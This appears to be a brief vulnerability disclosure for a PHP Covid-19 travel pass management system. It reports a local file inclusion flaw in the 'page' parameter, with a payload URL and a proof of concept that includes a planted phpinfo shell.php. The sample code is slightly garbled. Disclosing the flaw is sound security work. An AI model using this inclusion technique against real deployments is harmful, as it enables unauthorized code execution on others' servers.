# Covid-19 Travel Pass Management System v1.0 by oretnom23 has The local file contains

vendor : https://www.sourcecodester.com/php/15308/covid-19-travel-pass-management-system-phpoop-free-source-code.html

Vulnerability File: ip/ctpms/?page=

Vulnerability location: ip/ctpms/?page=, page

Payload: ip/ctpms/?page=shell

![image](https://user-images.githubusercontent.com/54017627/167079649-85ba6589-6285-4ecb-8ef5-974228634146.png)


We create a shell.php under the PHP file of the root of the website, which reads "<?" phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/167079465-9c835c77-4cf0-43d3-8656-c02a16044228.png)

And visit http://ip/ctpms/?page=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/167079525-fefac36b-fd4e-4ffa-bf73-be5f03cb31a4.png)
